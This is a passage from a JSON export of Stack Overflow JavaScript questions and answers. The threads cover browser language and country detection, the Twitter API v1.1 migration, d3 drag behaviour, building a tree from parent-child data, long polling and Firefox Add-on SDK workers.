            "body": "<p>I have wriitten a code in java script by using intellij inspection it says </p>\n\n<blockquote>\n  <p>function 'createPages' has inconsistent return points at line 35</p>\n</blockquote>\n\n<p>my function is </p>\n\n<pre><code>function createPages(noOfCounts) {\n    var default_page = 1, default_count = 15;\n    if (noOfCounts != \"\" &amp;&amp; noOfCounts != null) {\n        if (noOfCounts &gt; default_count) {\n            try {\n                var tempVal = parseInt(noOfCounts / default_count);\n                jQuery(\"#page\").val(tempVal);\n                return true;\n            }\n            catch (e) {\n                alert('Error . ' + e);\n            }\n        } else {\n            alert(\"It should not be less than the 15 and should be a number\");\n            return false;\n        }\n    }\n    else {\n        jQuery(\"#page\").val(default_page);\n        return true;\n    }\n}\n</code></pre>\n\n<p>and i call ed that method like  var valid =createPages(noOfCounts); How would i solve the isse?</p>\n",
            "last_activity_date": 1374122061,
            "question_id": 17714477,
            "score": 3,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "function has inconsistent return points"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p><code>navigator.language</code> isn't reliable as one of your linked questions states.</p>\n\n<p>The reason this is asked a lot, but you're still searching says something about the problem. That language detection <em>purely</em> on the client side is not anything close to reliable.</p>\n\n<p>First of all language preferences should only be used to detect language preferences - i.e. not location. My browser is set to <code>en_US</code>, because I wanted the English version. But I'm in the UK, so would have to alter this to <code>en_GB</code> to have my country detected via my browser settings. As the 'customer' that's not my problem. That's fine for language, but no good if all the prices on your site are in $USD.</p>\n\n<p>To <strong>detect language</strong> you really do need access to a server side script. If you're not a back end dev and want to do as much as possible on the client side (as your question), all you need is a one line PHP script that echos back the <a href=\"http://www.w3.org/International/questions/qa-accept-lang-locales\">Accept-Language</a> header. At its simplest it could just be:</p>\n\n<pre><code>&lt;?php\necho $_SERVER['HTTP_ACCEPT_LANGUAGE']; \n// e.g. \"en-US,en;q=0.8\"\n</code></pre>\n\n<p>You could get this via Ajax and parse the text response client side, e.g (using jQuery):</p>\n\n<pre><code>$.ajax( { url: 'script.php', success: function(raw){\n    var prefs = raw.split(',');\n    // process language codes ....\n} } );\n</code></pre>\n\n<p>If you were able to generate your HTML via a back end, you could avoid using Ajax completely by simply printing the language preferences into your page, e.g.</p>\n\n<pre><code>&lt;script&gt;\n    var prefs = &lt;?php echo json_encode($_SERVER['HTTP_ACCEPT_LANGUAGE'])?&gt;;\n&lt;/script&gt;\n</code></pre>\n\n<p>If you had no access to the server but could get a script onto another server, a simple JSONP service would look like:</p>\n\n<pre><code>&lt;?php\n$prefs = $_SERVER['HTTP_ACCEPT_LANGUAGE'];\n$jsonp = 'myCallback('.json_encode($prefs).')';\n\nheader('Content-Type: application/json; charset=UTF-8', true );\nheader('Content-Length: '.strlen($jsonp), true );\necho $jsonp;\n</code></pre>\n\n<p>Using jQuery for your Ajax you'd do something like:</p>\n\n<pre><code>function myCallback( raw ){\n    var prefs = raw.split(',');\n    // process language codes ....\n}\n$.ajax( {\n    url: 'http://some.domain/script.php',\n    dataType: 'jsonp'\n} );\n</code></pre>\n\n<p><strong>Country detection</strong> is another matter. On the client side there is <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/window.navigator.geolocation\">navigator.geolocation</a>, but it will most likely prompt your user for permission, so no good for a seamless user experience.</p>\n\n<p>To do invisibly, you're limited to geo IP detection. By the same token as above, don't use language to imply country either.</p>\n\n<p>To do country detection on the client side, you'll also need a back end service in order to get the client IP address and access a database of IP/location mappings. <a href=\"http://dev.maxmind.com/geoip/geoip2/javascript/\">Maxmind's GeoIP2 JavaScript client</a> appears to wrap this all up in a client-side bundle for you, so you won't need your own server (although I'm sure it will use a remote jsonp service). There's also <a href=\"http://freegeoip.net/\">freegeoip.net</a>, which is probably less hassle than MaxMind in terms of signing up, and it appears to be open source too.</p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Using jQuery, this line will display your user's country code.</p>\n\n<pre><code>  $.getJSON('http://freegeoip.net/json', function(result) {\n    alert(result.country_code);\n  });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p><strong>Question:</strong> Is there a javascript (client-side) code to get visitors country/language code, that is accurate and is cross-\"modern\"-browser ? I am looking for results like <code>'en-US'</code>, <code>'sv-SE'</code>, <code>'nl-NL'</code>, etc.</p>\n\n<p>Related questions to this have been asked before (some SO links: <a href=\"http://stackoverflow.com/questions/673905/best-way-to-determine-users-locale-within-browser\">1</a>,<a href=\"http://stackoverflow.com/questions/1043339/javascript-for-detecting-browser-language-preference\">2</a>,<a href=\"http://stackoverflow.com/questions/15327726/how-to-change-date-format-according-to-the-country\">3</a>,<a href=\"http://stackoverflow.com/questions/17588228/how-to-detect-visitor-country\">4</a>, among others) but I didn't find answer and some of the answers  are some yearls old and in some cases referring to even more old articles, which makes me think there are new solutions for this.</p>\n\n<p>I tried :</p>\n\n<pre><code>var language = window.navigator.userLanguage || window.navigator.language;\nconsole.log(language);\n</code></pre>\n\n<p>and got <code>\"sv\"</code> in Chrome and <code>\"en-GB\"</code> in Firefox, in the same machine, same place.</p>\n",
            "last_activity_date": 1425980627,
            "question_id": 17680413,
            "score": 3,
            "tags": [
                "javascript",
                "localization",
                "geolocation",
                "country-codes"
            ],
            "title": "Get visitors language &amp; country code with javascript (client-side)"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p><strong>The reason it's not working</strong></p>\n\n<p><code>In the wonderful world of bad ideas, Twitter is sunsetting this answer, as of May 2013, and will require, at minimum, that you either use one of their widgets, and shoehorn it in, or that you set up an application and do application-level authentication, even for public-timeline GET requests.</code> [<strong><a href=\"http://stackoverflow.com/questions/13056432/fetch-public-tweets-via-twitter-api-1-1-via-client-side-code-js\">From this post</a></strong>]</p>\n\n<p>This is entirely true. You either 'hack' together something using their wigets (<em>highly discouraged</em>, and if they change one line of code in their widget, your code will stop working completely), or you do what they suggest and upgrade to <strong>authenticated requests</strong> using OAuth and the 1.1 API.</p>\n\n<p><strong>Links you must read</strong></p>\n\n<p>So, you can't just change the <strong>/1/</strong> to <strong>/1.1/</strong> in the URL and expect it to work.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/17166740/twitter-api-please-migrate-to-api-v1-1/17167138#17167138\">This post</a> explains how the 1.0 API is deprecated, provides evidence from the twitter site, and explains how you need to perform authenticated requests.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/17166727/how-to-get-twitter-feed-form-twitter-api-1-1/17167256#17167256\">This post</a> has a little information on the 1.1 API and how it returns JSON formatted data.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/17057941/twitter-api-get-user-follower-count-with-1-1/17061274#17061274\">This post</a> explains how you'll get a <code>410 GONE</code> status if you try and make any requests to the 1.0 API from now on, and what that means.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/17018748/how-can-i-get-twitter-followers-using-http-request/17019833#17019833\">This post</a> explains what the error you're getting means</p>\n\n<p>...and finally, <a href=\"http://stackoverflow.com/questions/12916539/simplest-php-example-retrieving-user-timeline-with-twitter-api-version-1-1/15314662#15314662\">This post</a> explains step-by-step how, if you choose to use <a href=\"/questions/tagged/php\" class=\"post-tag\" title=\"show questions tagged 'php'\" rel=\"tag\">php</a> as your server-side language, you make authenticated requests and requires a simple library (single file include) to get it to work.</p>\n\n<p><strong>In Closing</strong></p>\n\n<p>Don't hack something together using JavaScript, as soon as Twitter makes an update to their widget, that's it, you're screwed. Use a server-side language and do it properly as per their <a href=\"https://dev.twitter.com/docs/api\">documentation</a>.</p>\n",
                    "is_accepted": true,
                    "score": 13
                }
            ],
            "body": "<p>Recently Twitter updated its API to v1.1 and my program stops working but no matter how much documentation I read, I can't seem to really understand what is needed to make my codes work. </p>\n\n<p>My used-to-work codes are as below :</p>\n\n<pre><code>function getTweets() {\n\nvar url = 'http://search.twitter.com/search.json?q=%23yolo&amp;rpp=10&amp;result_type=recent&amp;callback=?';\n\n    $.getJSON(url, function (json) {\n\n        display = [];\n        displayDateTime = [];\n        if (json.results.length != null) {\n            for (var i = 0; i &lt; json.results.length; i++) {\n                var time = new Date(json.results[i].created_at);\n\n                display.push(\"@\" + json.results[i].from_user + \": \" + json.results[i].text);\n                displayDateTime.push(\"[\" + time.toString().substring(0, 19) + \"]\");\n\n            } //end of for loop\n\n            display.reverse();\n            displayDateTime.reverse();\n\n            loadOtherStuffs();\n        } //end of if\n        else {\n            setTimeout(getTweets, 24000);\n        }\n    });     //end of getJSON\n}//end of getTweets()\n</code></pre>\n\n<p>I tried changing the url to <a href=\"https://api.twitter.com/1.1/search/tweets.json\" rel=\"nofollow\">https://api.twitter.com/1.1/search/tweets.json</a> and <code>json.results</code> to <code>json.statuses</code> but it still won't work. It seems that there's a need for <code>oAuth</code> to make this work again but I'm not too sure.  </p>\n\n<p>What are exactly the steps to make this work again?</p>\n",
            "last_activity_date": 1373894894,
            "question_id": 17207850,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "api",
                "twitter"
            ],
            "title": "Need help converting to Twitter API v1.1 - JavaScript"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>You simply need to set the <code>origin()</code> function accordingly. In the second case this is straightforward, in the first case somewhat more difficult because you are using coordinates as well as a transform. The basic pattern (for the second case) looks like this:</p>\n\n<pre><code> .origin(function() { \n        var t = d3.select(this);\n        return {x: t.attr(\"x\"), y: t.attr(\"y\")};\n    })\n</code></pre>\n\n<p>Updated jsfiddle <a href=\"http://jsfiddle.net/Y8y7V/1/\">here</a>.</p>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>I am trying to implement drag behavior for group consisting from HTML-text and background-rectangle using the d3 framework. I was able to get it working, although when not setting the drag.origin I can see noticeable jump due to the mouse-position/element-coordinates offset. Exactly how described on the <a href=\"https://github.com/mbostock/d3/wiki/Drag-Behavior\" rel=\"nofollow\">d3 wiki-page</a>\nAlthough the page described how to set the Origin for dragging, I do not properly understand how ti implement it in my example. I tried two different approaches : using the  element for grouping the elements together and defining new  element holding tose. In the first case I have to use the translate-function and I do not even know how to get the coordinates of the group.</p>\n\n<pre><code>var svg = d3.select(\"body\").append(\"svg\")\n  .attr(\"width\", 960)\n  .attr(\"height\", 500);\n\nvar group = svg.append(\"svg:g\")\n  .attr(\"transform\", \"translate(10, 10)\")\n  .attr(\"id\", \"group\");\n\nvar rect1 = group.append(\"svg:rect\")\n  .attr(\"rx\", 6)\n  .attr(\"ry\", 6)\n  .attr(\"x\", 5/2)\n  .attr(\"y\", 5/2)\n  .attr(\"id\", \"rect\")\n  .attr(\"width\", 250)\n  .attr(\"height\", 125)\n  .style(\"fill\", 'white')\n  .style(\"stroke\", d3.scale.category20c())\n  .style('stroke-width', 5);\n\n\nvar html1 = group.append(\"foreignObject\")\n  .attr(\"x\", 50)\n  .attr(\"y\", 25)\n  .attr(\"width\", 200)\n  .attr(\"height\", 100)\n  .attr(\"id\", \"fobject\")\n  .style(\"border-color\", d3.scale.category20c())\n  .append(\"xhtml:div\")\n  .style(\"font\", \"14px 'Helvetica Neue'\")\n  .html(\"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec eu enim quam.\");\n\nvar innerSvg = svg.append(\"svg\")\n  .attr(\"x\", 500)\n  .attr(\"y\", 10)\n  .attr(\"id\", \"innerSvg\");\n\nvar rect2 = innerSvg.append(\"svg:rect\")\n  .attr(\"rx\", 6)\n  .attr(\"ry\", 6)\n  .attr(\"x\", 5/2)\n  .attr(\"y\", 5/2)\n  .attr(\"id\", \"rect\")\n  .attr(\"width\", 250)\n  .attr(\"height\", 125)\n  .style(\"fill\", 'white')\n  .style(\"stroke\", d3.scale.category20c())\n  .style('stroke-width', 5);\n\nvar html2 = innerSvg.append(\"foreignObject\")\n  .attr(\"x\", 50)\n  .attr(\"y\", 25)\n  .attr(\"width\", 200)\n  .attr(\"height\", 100)\n  .attr(\"id\", \"fobject\")\n  .style(\"border-color\", d3.scale.category20c())\n  .append(\"xhtml:div\")\n  .style(\"font\", \"14px 'Helvetica Neue'\")\n  .html(\"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec eu enim quam.\");\n\nvar drag1 = d3.behavior.drag()\n    .on(\"drag\", function(d,i) {\n        d3.select(this).attr(\"transform\", function(d,i){\n            return \"translate(\" + [ d3.event.x,d3.event.y ] + \")\"\n        })\n    });\n\nvar drag2 = d3.behavior.drag()\n    .on(\"drag\", function(d,i) {\n        d3.select(this)\n        .attr(\"x\", d3.event.x)\n        .attr(\"y\", d3.event.y);\n    });\n\ngroup.call(drag1);\ninnerSvg.call(drag2);\n</code></pre>\n\n<p>I would very appreciate any explanation, naturally I prepared a working example here : <a href=\"http://jsfiddle.net/Y8y7V/\" rel=\"nofollow\">http://jsfiddle.net/Y8y7V/</a></p>\n",
            "last_activity_date": 1405947819,
            "question_id": 15966256,
            "score": 3,
            "tags": [
                "javascript",
                "d3.js",
                "drag"
            ],
            "title": "How to set the Origin (drag.origin) for drag behavior in d3 JavaScript library"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Since this hasn't been officially answered I wrote this if this helps at all</p>\n\n<p>Its extends jquery so that it detects <kbd>ctrl</kbd> + <kbd>z</kbd>. and can be used like this:</p>\n\n<pre><code>$('input').disableUndo();\n</code></pre>\n\n<p>or if you want it to do something when the user tries to undo</p>\n\n<pre><code>$('input').disableUndo(function(element){\n    // do custom stuff   \n});\n</code></pre>\n\n<p><strong><a href=\"http://jsfiddle.net/CVrFU/5/\" rel=\"nofollow\">jsFiddle Demo</a></strong></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>How do I implement a ctrl z in javascript?</p>\n\n<p>After numerous google searches, I stumbled upon the execCommand:</p>\n\n<p>I'm using <code>document.execCommand(\"undo\", false, null)</code>, but it doesn't work\nwith Firefox.</p>\n\n<p>I put in the 2nd and 3rd parameters even though they are optional in Firefox.</p>\n\n<p>Any ideas, insights, suggestions, examples, etc?</p>\n",
            "last_activity_date": 1368795999,
            "question_id": 15884031,
            "score": 3,
            "tags": [
                "javascript"
            ],
            "title": "Implementing undo functionality in JavaScript"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I have a solution that works. I can give you hints as far as solving it. The good thing is that your data doesn't contain any forward references to nodes. So you can create your tree with just one pass through the array.</p>\n\n<p>Your algorithm will look like this.</p>\n\n<ol>\n<li>Create a map that maps id's to nodes. This will make it easy to look up nodes.</li>\n<li>Loop through the array of nodes.</li>\n<li>For each element.\n<ol>\n<li>Add an entry into the map.</li>\n<li>Add a <code>children</code> property (an array) to this node.</li>\n<li>Does the element have a parent? If not it must be the root, so assign the this element to the root of the tree.</li>\n<li>This element has a parent, so look up the parent node, and then add this current node as a child of the parent node (add it to the <code>children</code> array).</li>\n</ol></li>\n</ol>\n\n<p>This should help you solve the problem. If you're having specific issues with this algorithm I can point out where the problems are and how to solve it or post the solution and explain how I solved it. </p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I looked at the solution that you have. You actually don't need recursion for this and you can do this iteratively using the algorithm I described above. You are also modifying the structure in-place, which makes the algorithm more complicated. But you're somewhat on the right track. Here is how I solved it:</p>\n\n<pre><code>var idToNodeMap = {}; //Keeps track of nodes using id as key, for fast lookup\nvar root = null; //Initially set our loop to null\n\n//loop over data\nfor(var i = 0; i &lt; data.length; i++) {\n    var datum = data[i];\n\n    //each node will have children, so let's give it a \"children\" poperty\n    datum.children = [];\n\n    //add an entry for this node to the map so that any future children can\n    //lookup the parent\n    idToNodeMap[datum._id] = datum;\n\n    //Does this node have a parent?\n    if(typeof datum.parentAreaRef === \"undefined\") {\n        //Doesn't look like it, so this node is the root of the tree\n        root = datum;        \n    } else {        \n        //This node has a parent, so let's look it up using the id\n        parentNode = idToNodeMap[datum.parentAreaRef.id];\n\n        //We don't need this property, so let's delete it.\n        delete datum.parentAreaRef;\n\n        //Let's add the current node as a child of the parent node.\n        parentNode.children.push(datum);        \n    }\n}\n</code></pre>\n\n<p>Now <code>root</code> points to the entire tree.</p>\n\n<p><a href=\"http://jsfiddle.net/hRdEY/1/\" rel=\"nofollow\">Fiddle</a>.</p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Give it a try:</p>\n\n<pre><code>   var obj = {};\n   obj.rootElements = [];\n   var currentRoot;\n   var currentParent;\n   for (s in a) {\n       var t = a[s];\n       var id = t._id;\n       if (t.parentAreaRef) {\n           var parentId = t.parentAreaRef.id;\n           if (parentId == currentParent._id) {\n               //add children\n               if (!currentParent.children) {\n                   currentParent.children = [];\n               }\n               currentParent.children.push(t);\n           }\n           else {\n               addChildToParent(t, parentId);\n           }\n\n       }\n       else // is root\n       {\n           currentRoot = t;\n           currentParent = t;\n           obj.rootElements.push(currentRoot);\n       }\n   }\n\n   var t = currentRoot\n\n   function addChildToParent(child, parentId, root) {\n       for (p in a) {\n           if (a[p]._id.toString() == parentId.toString()) {\n               if (!a[p].children) {\n                   a[p].children = [];\n               }\n               a[p].children.push(t);\n           }\n       }\n   }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I know I'm too late, but since I just finished my contribution to a sample implementation of how this can be done I thought I would share it, since it might be found useful / or give inspiration to an alternative solution.</p>\n\n<p>The implementation can be found here: <a href=\"http://jsfiddle.net/sw_lasse/9wpHa/\" rel=\"nofollow\">http://jsfiddle.net/sw_lasse/9wpHa/</a></p>\n\n<p>The main idea of the implementation centers around the following recursive function:</p>\n\n<pre><code>// Get parent of node (recursive)\nvar getParent = function (rootNode, rootId) {\n\n    if (rootNode._id === rootId)\n        return rootNode;\n\n    for (var i = 0; i &lt; rootNode.children.length; i++) {\n        var child = rootNode.children[i];\n        if (child._id === rootId)\n            return child;\n\n        if (child.children.length &gt; 0)\n            var childResult = getParent(child, rootId);\n\n        if (childResult != null) return childResult;\n    }\n    return null;\n};\n</code></pre>\n\n<p>... that is used to build the tree.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I know it's late, but I just finished this algorithm and maybe it can help some other people looking to solve the same problem: <a href=\"http://jsfiddle.net/_akerbeltz_/9dQcn/\" rel=\"nofollow\">http://jsfiddle.net/<em>akerbeltz</em>/9dQcn/</a></p>\n\n<p>A good thing about it is that it doesn't requires any special sort on the original object.</p>\n\n<p>If you need to adapt it to your needs change the following lines:</p>\n\n<ol>\n<li><p>Change the _id and the parentAreaRef.id depending on your structure.</p>\n\n<p><code>if (String(tree[i]._id) === String(item.parentAreaRef.id)) {</code></p></li>\n<li><p>Change the parentAreaRef depending on your structure.</p>\n\n<p><code>if (tree[idx].parentAreaRef) buildTree(tree, tree.splice(idx, 1)[0])\n</code></p></li>\n</ol>\n\n<p>Hope it helps!</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Can anyone help converting the following list of parent-child objects:</p>\n\n<pre>\n[\n   {\n      \"name\":\"root\",\n      \"_id\":\"root_id\",\n   },\n   {\n      \"name\":\"a1\",\n      \"parentAreaRef\":{\n         \"id\":\"root_id\",\n      },\n      \"_id\":\"a1_id\",\n   },\n   {\n      \"name\":\"a2\",\n      \"parentAreaRef\":{\n         \"id\":\"a1_id\",\n      },\n      \"_id\":\"a2_id\",\n   },\n   {\n      \"name\":\"a3\",\n      \"parentAreaRef\":{\n         \"id\":\"a2_id\",\n      },\n      \"_id\":\"a3_id\",\n   },\n   {\n      \"name\":\"b1\",\n      \"parentAreaRef\":{\n         \"id\":\"root_id\",\n      },\n      \"_id\":\"b1_id\",\n   },\n   {\n      \"name\":\"b2\",\n      \"parentAreaRef\":{\n         \"id\":\"b1_id\",\n      },\n      \"_id\":\"b2_id\",\n   },\n   {\n      \"name\":\"b3\",\n      \"parentAreaRef\":{\n         \"id\":\"b1_id\",\n      },\n      \"_id\":\"b3_id\",\n   }\n]</pre>\n\n<p>into a tree structure showing the parent-child relationship:</p>\n\n<pre>\n[\n    {\n        \"name\": \"root\",\n        \"_id\":\"root_id\",\n        \"children\": [\n            {\n                \"name\": \"a1\",\n                \"_id\":\"a1_id\",\n                \"children\" : [\n                    {\n                        \"name\" : \"a2\",\n                        \"_id\":\"a2_id\",\n                        \"children\" : [\n                            {\n                                \"name\" : \"a3\"\n                                \"_id\":\"a3_id\"\n                            }\n                        ]\n                    }\n                ]\n            }, \n            {\n                \"name\": \"b1\",\n                \"_id\":\"b1_id\",\n                \"children\" : [\n                    {\n                        \"name\" : \"b2\"\n                        \"_id\":\"b2_id\"\n                    },\n                    {\n                        \"name\" : \"b3\"\n                        \"_id\":\"b3_id\"\n                    }\n                ]\n            }\n        ]\n    }\n]\n</pre>\n\n<p>(The output structure is an array to allow for multiple roots but if we can get a solution that handles a single root that's great too.)</p>\n\n<p>The output tree looks like this:</p>\n\n<pre>\n\nroot\n  |\n  -- a1\n  |   |\n  |   -- a2\n  |       |\n  |       -- a3\n  | \n  -- b1\n      |\n      -- b2\n      -- b3\n\n\n</pre>\n\n<p>Thanks!</p>\n",
            "last_activity_date": 1401386976,
            "question_id": 15792794,
            "score": 3,
            "tags": [
                "javascript",
                "algorithm"
            ],
            "title": "Convert parent-child array to tree"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>In theory with setinterval, you could have overlapping processing,</p>\n\n<p>so if one oncomplete handler takes particularly long, it may overlap with the next call, slowing down your system or resolving in unpredictable ways.</p>\n\n<p>by explicitly starting the next poll after the first one has completed, you get less regular calls with the advantage that you're guaranteed to only doing as one unit of work at a time as a byproduct.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>With long polling the server does not return unless data is ready, otherwise it holds the network connection open until data is ready, at which stage it can \"push\" to client as client is already waiting. Wikipedia has a good explanation. <a href=\"http://en.wikipedia.org/wiki/Long_polling#Long_polling\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Long_polling#Long_polling</a>.  In your example, lponcomplete might not be called for many minutes.</p>\n\n<p>Using constant settimeout type polling means that data that is ready immediately after your first request completes will not be delivered until your next poll, as the server as no connection to the client.</p>\n\n<p>For the server, long polling keeps a socket open for long periods, tying up resource, while repeated short polling causes more network traffic.</p>\n\n<p>Html5 has new stuff coming like websockets to help in this area too, so you might want to read about that also.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>As the name suggest <em>Long Polling</em> means polling something for a long time.</p>\n\n<pre><code>$.post('/path/to/script', {}, lpOnComplete, 'json');\n</code></pre>\n\n<p>Here is what the actual process starts, You make an ajax call to some script on server, in this case its <code>/path/to/script</code> , You need to make your server script(<code>php</code> for example) smart enough so that it only respond to request's when required data is available, the script should wait for a specified time period(for example 1 minute) and if no data available upto 1 minute then it should return without data.</p>\n\n<p>As soon as server return something, in your callback function you again make an ajax call to the same script and the server script again continues the process.</p>\n\n<p>Consider a chat application, In conventional way you are polling the server say every 2 second's and the server return's even if no messages are available.If upto one minute server get's no new messages for you, you end up hitting the server 30 times in last one minute.</p>\n\n<p>Now consider <strong><em>Long Polling</em></strong> way, you set your server script to wait for one minute for the new messages. From the client, you make a single ajax call to your script and say no messages are arriving for next one minute, server will not respond until 1 minute. And you have hit the server just one time in last 1 minute. Can you imagine <strong>30 Hit Vs 1 Hit</strong></p>\n",
                    "is_accepted": true,
                    "score": 9
                }
            ],
            "body": "<p>I am studying the ajax long polling but I am confused. what is different in traditional ajax calls and long polling </p>\n\n<pre><code>   var lpOnComplete = function(response) {\n   alert(response);\n   // do more processing\n   lpStart();\n  };\n\n    var lpStart = function() {\n    $.post('/path/to/script', {}, lpOnComplete, 'json');\n    };\n\n    $(document).ready(lpStart);\n</code></pre>\n\n<p>this example is just calling in recursive manner to the server.. what is different than the traditional call in setInterval..</p>\n",
            "last_activity_date": 1364706980,
            "question_id": 15724055,
            "score": 3,
            "tags": [
                "javascript",
                "jquery",
                "asp.net",
                "ajax"
            ],
            "title": "Long polling...really"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>NorthWest = NorthEast Lat , SouthWest Lng</p>\n\n<p>SouthEast = SouthWest Lat , NorthEast Lng</p>\n\n<pre><code>var bounds rectangle.getBounds();\nvar NE = bounds.getNorthEast();\nvar SW = bounds.getSouthWest();\nvar NW = new google.maps.LatLng(NE.lat(),SW.lng());\nvar SE = new google.maps.LatLng(SW.lat(),NE.lng());\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                }
            ],
            "body": "<p>How to get 4 vertex coordinates from gmaps RECTANGLE (Overlay)?</p>\n\n<p>I can get only NE e SW lat long from <code>selectedShape.getBounds()</code></p>\n\n<p>I need 4 vertex rectangle to post-process check in MySQL php functions.</p>\n",
            "last_activity_date": 1386661461,
            "question_id": 15536241,
            "score": 3,
            "tags": [
                "javascript",
                "google-maps"
            ],
            "title": "How to get 4 vertex coordinates from gmaps RECTANGLE ( Overlay)?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Not sure I got your problem. The event you mentioned, <a href=\"https://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/content/worker.html#detach\" rel=\"nofollow\">detach</a>, is also emitted when a the tab is reloaded:</p>\n\n<pre><code>const { add, remove } = require(\"sdk/util/array\");\nconst workers = [];\n\nrequire(\"sdk/page-mod\").PageMod({\n  include: \"*\",\n  contentScript: \"alert('executed')\",\n  onAttach: function(worker) {\n    add(workers, worker);\n    console.log('attached: ', workers.length);\n\n    worker.on('detach', function() {\n      remove(workers, worker);\n      console.log('detached: ', workers.length);\n    })\n  }\n});\n</code></pre>\n\n<p>When I reload the page the detach's listener is executed. Anyway, to check if a tab's associate to the worker is the active's tab you should be able to compare just the tab object: <code>(workers[index].tab === tabs.activeTab)</code>. Notice also that in Add-on SDK 1.14 tabs have also the <code>id</code> property, so you can use it to identify themselves.\nAnd the <code>for\u2026in</code> loop for index is not reccomended: <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Statements/for...in\" rel=\"nofollow\">https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Statements/for...in</a> check the description section. I would rather use the <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Statements/for...of\" rel=\"nofollow\">for\u2026of</a>:</p>\n\n<pre><code>for (let worker of workers) { ... }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>ZERO is right, the event <code>detach</code> is emitted on reload.<br>\nBut when I open a different page in the same tab no detach-event is been emitted!<br>\nSo, i.e., when I have loaded some page A in tab 1 and click on a link which opens a different page B in the same tab 1 I have to detach the worker for page A manually(?)    </p>\n\n<pre><code>var workers = [];    \n\nrequire('page-mod').PageMod({\n  include: '*',\n  contentScriptWhen: 'end',\n  contentScript: [require('self').data.url('bla.js')],\n  onAttach: function(worker) {\n    var w = workers.length;\n    while (w--) {\n      if (worker.tab === workers[w].tab) {\n        workers.splice(w, 1);\n        break;\n      }\n    }\n    workers.push(worker);\n    // other stuff\n  }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Ran into this too. The Worker objects seem to stick around for some past pages (and reused when going Back and Forward in history). The solution is to listen to the <code>pagehide</code> and <code>pageshow</code> events so as to only keep the currently shown workers in the array:</p>\n\n<pre><code>var pageMod = require(\"sdk/page-mod\");\nvar array = require('sdk/util/array');\n\nvar pageWorkers = [];\npageMod.PageMod({\n  onAttach: function(worker) {\n      array.add(pageWorkers, worker);\n      worker.on('pageshow', function() { array.add(pageWorkers, this); });\n      worker.on('pagehide', function() { array.remove(pageWorkers, this); });\n      worker.on('detach', function() { array.remove(pageWorkers, this); });\n      // do other work.\n  }\n});\n</code></pre>\n\n<p>Note that <code>array.add</code> function takes care of not adding duplicates.</p>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>I have been working on a context-menu that communicates with a page mod and come up against an issue.</p>\n\n<p>I am able to send a communication with right click to the page / tab in view as long as I do not refresh the page. When I refresh the page a new worker is created and the context menu cannot communicate with the worker.</p>\n\n<p>I now have two identical workers but it is like the old one has expired. That means this loop in onMessage: does not work because it picks up the first worker.</p>\n\n<pre><code>for (index = 0; index &lt; workers.length; index += 1) {\n    if (workers[index].tab.index === tabs.activeTab.index) {\n    workers[index].port.emit(\"rightClick\", string, ss.storage.product);\n    }\n}\n</code></pre>\n\n<p>I have been looking to remove the old worker on refresh but there seems to be no option to do so. Am I fundamentally missing something about the handling of workers?</p>\n\n<p>The error I receive is:\nError: The page is currently hidden and can no longer be used until it is visible again.</p>\n\n<p>This is consistent with the fact that as far as the worker is concerned I am now looking at a new page in the same tab. I thought worker.on('detach', function(){}) was supposed to handle this but it seems this is only on the closing of the tab.</p>\n\n<p>Any advice would be appreciated.</p>\n\n<p><em>added</em>\nOK after a little break I decided to use the detachWorker function recommended elsewhere for detach. I placed it at the top of my pageMod object as below</p>\n\n<pre><code>// Clean up duplicate worker\nfor (index in workers) {\n    if(workers[index].url === worker.url &amp;&amp; workers[index].tab.index === worker.tab.index) {\n        detachWorker(workers[index], workers);\n    }\n}\n</code></pre>\n\n<p>This fixes the issue (for now) although I don't think it is the correct approach. Any advances on a solution :).</p>\n",
            "last_activity_date": 1385580560,
            "question_id": 15502043,
            "score": 3,
            "tags": [
                "javascript",
                "firefox-addon-sdk"
            ],
            "title": "Addon SDK - context-menu and page-mod workers"
        },
        {
            "answer_count": 2,
            "answers": [
                {
